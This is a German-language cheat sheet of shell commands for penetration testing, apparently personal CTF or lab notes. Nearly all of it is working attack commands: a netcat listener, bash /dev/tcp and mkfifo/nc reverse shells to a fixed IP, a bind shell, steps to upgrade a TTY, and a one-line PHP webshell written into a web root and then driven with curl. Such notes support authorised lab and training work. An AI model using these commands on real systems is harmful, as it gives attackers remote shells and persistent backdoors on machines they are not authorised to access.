# Shells / Reverse-Shells



<details>

<summary>Links:</summary>

[https://www.revshells.com/](https://www.revshells.com/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)

</details>

***

## Netzwerkanalyse und Shell-Verbindungen mit Netcat

### Lokalen Port für eingehende Verbindungen mit Netcat öffnen

```bash
nc -lvnp 1234
```

### Reverse Shell von einem entfernten Server senden

```bash
bash -c 'bash -i >& /dev/tcp/10.14.66.169/6543 0>&1'
```

### Alternative Methode zur Übertragung einer Reverse Shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.66.169 6543 >/tmp/f
```

### Bind Shell auf dem entfernten Server starten

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

### Verbindung zu einer Bind Shell auf dem entfernten Server herstellen

```bash
nc 10.10.10.1 1234
```

***

## Shell stabilisieren und verbessern

### Terminal-Umgebung exportieren

```bash
export TERM=xterm
```

### Shell-TTY upgraden (Schritt 1)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Shell-TTY upgraden (Schritt 2)

1. `Ctrl + Z` drücken
2.  folgenden Befehl eingeben:

    ```bash
    stty raw -echo
    ```
3. Mit `fg` zur Shell zurückkehren
4. Zwei Mal `Enter` drücken

***

## PHP-Webshell erstellen und verwenden

### Eine PHP-Webshell-Datei erzeugen

```bash
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

### Einen Befehl über die hochgeladene Webshell ausführen

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
